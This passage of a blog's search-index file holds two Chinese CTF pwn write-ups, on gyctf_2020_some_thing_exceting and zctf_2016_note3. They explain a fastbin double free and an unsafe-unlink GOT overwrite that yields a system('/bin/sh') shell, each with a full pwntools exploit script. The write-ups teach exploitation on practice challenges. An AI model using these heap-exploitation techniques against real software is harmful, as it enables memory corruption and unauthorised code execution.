,先单独free同一个两次堆不行，得先创建两次"></a>漏洞是利用double free ,先单独free同一个两次堆不行，得先创建两次</h4><pre><code class="lang-py">bss=0x6020a8-0x10add(0x40,&#39;MMMM&#39;,0x50,&#39;NNNN&#39;)add(0x40,&#39;AAAA&#39;,0x40,&#39;BBBB&#39;)dele(0)</code></pre><p><img src="https://i.imgs.ovh/2023/10/16/ruHnp.png" alt="image-20231016161307844"></p><p><img src="https://i.imgs.ovh/2023/10/16/ruMbT.png" alt="image-20231016161325105"></p><pre><code class="lang-py">dele(1)</code></pre><h4 id="这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零"><a href="#这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零" class="headerlink" title="这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零"></a>这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零</h4><p><img src="https://i.imgs.ovh/2023/10/16/rup5u.png" alt="image-20231016161832970"></p><p><img src="https://i.imgs.ovh/2023/10/16/ruuyO.png" alt="image-20231016162207401"></p><pre><code class="lang-py">dele(0) #double free</code></pre><h4 id="这里的话是double-free-，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等"><a href="#这里的话是double-free-，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等" class="headerlink" title="这里的话是double free ，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等"></a>这里的话是double free ，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等</h4><p><img src="https://i.imgs.ovh/2023/10/16/ru4mt.png" alt="image-20231016163943852"></p><p><img src="https://i.imgs.ovh/2023/10/16/ruzIU.png" alt="image-20231016162508547"></p><pre><code>add(0x40,p64(bss),0x40,&#39;AAAA&#39;)</code></pre><h4 id="再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址"><a href="#再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址" class="headerlink" title="再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址"></a>再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址</h4><p><img src="https://i.imgs.ovh/2023/10/16/rujCC.png" alt="image-20231016163754041"></p><p><img src="https://i.imgs.ovh/2023/10/16/ru5cm.png" alt="image-20231016164225408"></p><h4 id="再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址"><a href="#再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址" class="headerlink" title="再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址"></a>再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址</h4><pre><code class="lang-py">add(0x40,&#39;MMMM&#39;,0x40,&#39;kkkk&#39;)</code></pre><p><img src="https://i.imgs.ovh/2023/10/16/ruv62.png" alt="image-20231016164831150"></p><p><img src="https://i.imgs.ovh/2023/10/16/ruycj.png" alt="image-20231016164848340"></p><h4 id="再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc-0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。"><a href="#再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc-0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。" class="headerlink" title="再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc 0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。"></a>再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc 0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。</h4><pre><code class="lang-py">show(4)</code></pre><h4 id="想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。"><a href="#想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。" class="headerlink" title="想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。"></a>想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。</h4><p><img src="https://i.imgs.ovh/2023/10/16/r7XdW.png" alt="image-20231016170214324"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,26884)p=process(&quot;./gyctf_2020_some_thing_exceting&quot;)elf=ELF(&#39;./gyctf_2020_some_thing_exceting&#39;)libc=ELF(&#39;./libc-2.23.so&#39;)context.log_level=&quot;debug&quot;def add(size1,content1,size2,content2):    p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;1&#39;)    p.sendlineafter(&quot;&gt; ba&#39;s length : &quot;,str(size1))    p.sendlineafter(&#39;&gt; ba : &#39;,content1)    p.sendlineafter(&quot;&gt; na&#39;s length : &quot;,str(size2))    p.sendlineafter(&#39;&gt; na : &#39;,content2)def dele(index):    p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;3&#39;)    p.sendlineafter(&#39;Banana ID :&#39;,str(index))def show(index):    p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;4&#39;)    p.sendlineafter(&#39;&gt; Banana ID : &gt; SCP project ID : &#39;,str(index))bss=0x6020a8-0x10add(0x50,&#39;MMMM&#39;,0x50,&#39;NNNN&#39;)add(0x50,&#39;AAAA&#39;,0x50,&#39;BBBB&#39;)dele(0)dele(1)dele(0)add(0x50,p64(bss),0x50,&#39;AAAA&#39;)add(0x50,&#39;MMMM&#39;,0x50,&#39;kkkk&#39;)add(0x50,b&#39;1&#39;,0x60,b&#39;&#39;)show(4)#gdb.attach(p)sleep(1)#pause()#dele(0)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/14/zctf_2016_note3/"/>
      <url>/2023/10/14/zctf_2016_note3/</url>
      
        <content type="html"><![CDATA[<h1 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h1><h4 id="这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。"><a href="#这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。" class="headerlink" title="这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。"></a>这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。</h4><h4 id="先看add函数"><a href="#先看add函数" class="headerlink" title="先看add函数"></a>先看add函数</h4><p><img src="https://i.imgs.ovh/2023/10/14/rAZ7T.png" alt="image-20231014214742855"></p><h4 id="第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub-4008dd的函数，再点进去"><a href="#第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub-4008dd的函数，再点进去" class="headerlink" title="第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub_4008dd的函数，再点进去"></a>第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub_4008dd的函数，再点进去</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFTgo.png" alt="image-20231012210324374"></p><h4 id="sub-4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数-char-a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’-x00’时结束，这里的a3-10其实就是截止符’-xa’，后面两条已经不重要了。"><a href="#sub-4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数-char-a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’-x00’时结束，这里的a3-10其实就是截止符’-xa’，后面两条已经不重要了。" class="headerlink" title="sub_4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数 char a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’\x00’时结束，这里的a3=10其实就是截止符’\xa’，后面两条已经不重要了。"></a>sub_4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数 char a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’\x00’时结束，这里的a3=10其实就是截止符’\xa’，后面两条已经不重要了。</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFEWD.png" alt="image-20231012210438919"></p><h4 id="最后返回的是我们输入的第十二行size的值。第十九行的sub-4008dd函数也是同理，不过输入的长度有size决定。外面的sub-400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size"><a href="#最后返回的是我们输入的第十二行size的值。第十九行的sub-4008dd函数也是同理，不过输入的长度有size决定。外面的sub-400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size" class="headerlink" title="最后返回的是我们输入的第十二行size的值。第十九行的sub_4008dd函数也是同理，不过输入的长度有size决定。外面的sub_400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size"></a>最后返回的是我们输入的第十二行size的值。第十九行的sub_4008dd函数也是同理，不过输入的长度有size决定。外面的sub_400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFqNA.png" alt="image-20231012211843683"></p><h4 id="edit函数，先看第16行的read函数，第一个参数-amp-ptr-v3-其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。"><a href="#edit函数，先看第16行的read函数，第一个参数-amp-ptr-v3-其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。" class="headerlink" title="edit函数，先看第16行的read函数，第一个参数 *(&amp;ptr + v3)其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。"></a>edit函数，先看第16行的read函数，第一个参数 *(&amp;ptr + v3)其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFGp5.png" alt="image-20231012212200515"></p><h4 id="dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞"><a href="#dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞" class="headerlink" title="dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞"></a>dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFN7s.png" alt="image-20231012212926978"></p><h4 id="重点的地方在这，就是unlink的怎么构造。"><a href="#重点的地方在这，就是unlink的怎么构造。" class="headerlink" title="重点的地方在这，就是unlink的怎么构造。"></a>重点的地方在这，就是unlink的怎么构造。</h4><h4 id="先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd-ptr-0x18和bk-ptr-0x10，后期会进行和并"><a href="#先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd-ptr-0x18和bk-ptr-0x10，后期会进行和并" class="headerlink" title="先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd=ptr-0x18和bk=ptr-0x10，后期会进行和并"></a>先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd=ptr-0x18和bk=ptr-0x10，后期会进行和并</h4><pre><code class="lang-py">ptr=0x6020c8fd=ptr-0x18bk=ptr-0x10payload1=p64(0)+p64(0xb1)+p64(fd)+p64(bk)add(0x90,payload1) #堆0add(0,&#39;bbbb&#39;)      #堆1add(0x90,&#39;CCCC&#39;)   #堆2add(0x10,&#39;dddd&#39;)   #堆3 dele(1)</code></pre><h4 id="关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10-后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2"><a href="#关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10-后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2" class="headerlink" title="关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10,后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2"></a>关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10,后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2</h4><pre><code class="lang-py\">payload2=p64(0)*2+p64(0xb0)+p64(0xa0)add(0,payload2)</code></pre><h4 id="覆盖后的堆块是长这样的，把第堆2的大小和它的previous-in-use位改成了0-也就是上一个堆堆1没有使用"><a href="#覆盖后的堆块是长这样的，把第堆2的大小和它的previous-in-use位改成了0-也就是上一个堆堆1没有使用" class="headerlink" title="覆盖后的堆块是长这样的，把第堆2的大小和它的previous in use位改成了0,也就是上一个堆堆1没有使用"></a>覆盖后的堆块是长这样的，把第堆2的大小和它的previous in use位改成了0,也就是上一个堆堆1没有使用</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFaDX.png" alt="image-20231014153740961.png"></p><h4 id="当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous-size-0xbbb0c8这里表示上一个堆没有使用。"><a href="#当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous-size-0xbbb0c8这里表示上一个堆没有使用。" class="headerlink" title="当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous size ,0xbbb0c8这里表示上一个堆没有使用。"></a>当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous size ,0xbbb0c8这里表示上一个堆没有使用。</h4><p><img src="zctf_2016_note3.assets/AJTB31Sv6tYn9Vu.png" alt="image-20231014161643622.png"></p><h4 id="当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。"><a href="#当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。" class="headerlink" title="当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。"></a>当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFyAU.png" alt="image-20231014162533011.png"></p><h4 id="而在dele-2-后"><a href="#而在dele-2-后" class="headerlink" title="而在dele(2)后"></a>而在dele(2)后</h4><h4 id="存放堆2的指针被置零了"><a href="#存放堆2的指针被置零了" class="headerlink" title="存放堆2的指针被置零了"></a>存放堆2的指针被置零了</h4><p><img src="https://i.imgs.ovh/2023/10/14/rACx0.png" alt="image-20231014163605611.png"></p><h4 id="这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了"><a href="#这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了" class="headerlink" title="这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了"></a>这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了</h4><p><img src="https://i.imgs.ovh/2023/10/14/rAPjC.png" alt="image-20231014163850174.png"></p><h4 id="0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放"><a href="#0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放" class="headerlink" title="0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放"></a>0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放</h4><h4 id="之后的bin是这样的"><a href="#之后的bin是这样的" class="headerlink" title="之后的bin是这样的"></a>之后的bin是这样的</h4><p><img src="zctf_2016_note3.assets/x8DgM9LaTris3oF.png" alt="image-20231014164403504.png"></p><h4 id="然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写"><a href="#然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写" class="headerlink" title="然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写"></a>然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写</h4><pre><code class="lang-py">payload3 = p64(0) * 2 + p64(elf.got[&#39;free&#39;]) * 2 + p64(elf.got[&#39;atoi&#39;]) + p64(0) + p64(elf.got[&#39;atoi&#39;])edit(0,payload3)</code></pre><p><img src="https://i.imgs.ovh/2023/10/14/rALVt.png" alt="image-20231014164701954.png"></p><h4 id="再把edit堆0-也就是edit0x602018（free-got-地址的内容改写成-0x400730-puts-plt"><a href="#再把edit堆0-也就是edit0x602018（free-got-地址的内容改写成-0x400730-puts-plt" class="headerlink" title="再把edit堆0,也就是edit0x602018（free_got)地址的内容改写成(0x400730)puts_plt"></a>再把edit堆0,也就是edit0x602018（free_got)地址的内容改写成(0x400730)puts_plt</h4><pre><code class="lang-py">edit(0,p64(0X400730)[:-1]) #puts_plt</code></pre><p><img src="https://i.imgs.ovh/2023/10/14/rAXkm.png" alt="image-20231014165150300"></p><h4 id="这样再dele堆1的时候也就是free-0x6020d0这个地址，也就是puts-elf-got-‘atoi’-从而获得atoi的got项的内容，从而可以算出libc的偏移"><a href="#这样再dele堆1的时候也就是free-0x6020d0这个地址，也就是puts-elf-got-‘atoi’-从而获得atoi的got项的内容，从而可以算出libc的偏移" class="headerlink" title="这样再dele堆1的时候也就是free 0x6020d0这个地址，也就是puts(elf.got[‘atoi’]),从而获得atoi的got项的内容，从而可以算出libc的偏移"></a>这样再dele堆1的时候也就是free 0x6020d0这个地址，也就是puts(elf.got[‘atoi’]),从而获得atoi的got项的内容，从而可以算出libc的偏移</h4><pre><code class="lang-py">atoi_addr = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))success(&#39;atoi_addr = &#39; + hex(atoi_addr))</code></pre><p><img src="https://i.imgs.ovh/2023/10/14/rArgN.png" alt="image-20231014165713253"></p><h4 id="然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘-bin-sh’就可以提权了。"><a href="#然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘-bin-sh’就可以提权了。" class="headerlink" title="然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘/bin/sh’就可以提权了。"></a>然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘/bin/sh’就可以提权了。</h4><h4 id="最后的exp"><a href="#最后的exp" class="headerlink" title="最后的exp"></a>最后的exp</h4><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)p=process(&quot;./zctf_2016_note3&quot;)elf=ELF(&#39;./zctf_2016_note3&#39;)libc=ELF(&#39;./libc-2.23.so&#39;)context.log_level=&quot;debug&quot;def add(size,content):    p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;1&#39;)    p.sendlineafter(&#39;Input the length of the note content:(less than 1024)&#39;,str(size))    p.sendlineafter(&#39;Input the note content:&#39;,content)def edit(index,content):    p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;3&#39;)    p.sendlineafter(&#39;Input the id of the note:&#39;,str(index))    p.sendlineafter(&#39;Input the new content:&#39;,content)def dele(index):    p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;4&#39;)    p.sendlineafter(&#39;Input the id of the note:&#39;,str(index))ptr=0x6020c8fd=ptr-0x18bk=ptr-0x10payload1=p64(0)+p64(0xb1)+p64(fd)+p64(bk)add(0x90,payload1)add(0,&#39;bbbb&#39;)add(0x90,&#39;CCCC&#39;)add(0x10,&#39;dddd&#39;)dele(1)payload2=p64(0)*2+p64(0xb0)+p64(0xa0)add(0,payload2) dele(2)  #he bingpayload3 = p64(0) * 2 + p64(elf.got[&#39;free&#39;]) * 2 + p64(elf.got[&#39;atoi&#39;]) + p64(0) + p64(elf.got[&#39;atoi&#39;])edit(0,payload3)edit(0,p64(0X400730)[:-1]) #puts_pltdele(1)  #dele di 0 ge dui atoi_addr = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))success(&#39;atoi_addr = &#39; + hex(atoi_addr))#gdb.attach(p)sleep(1)base=atoi_addr-libc.sym[&#39;atoi&#39;]system=base+libc.sym[&#39;system&#39;]edit(3,p64(system))p.sendline(&#39;/bin/sh&#39;)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
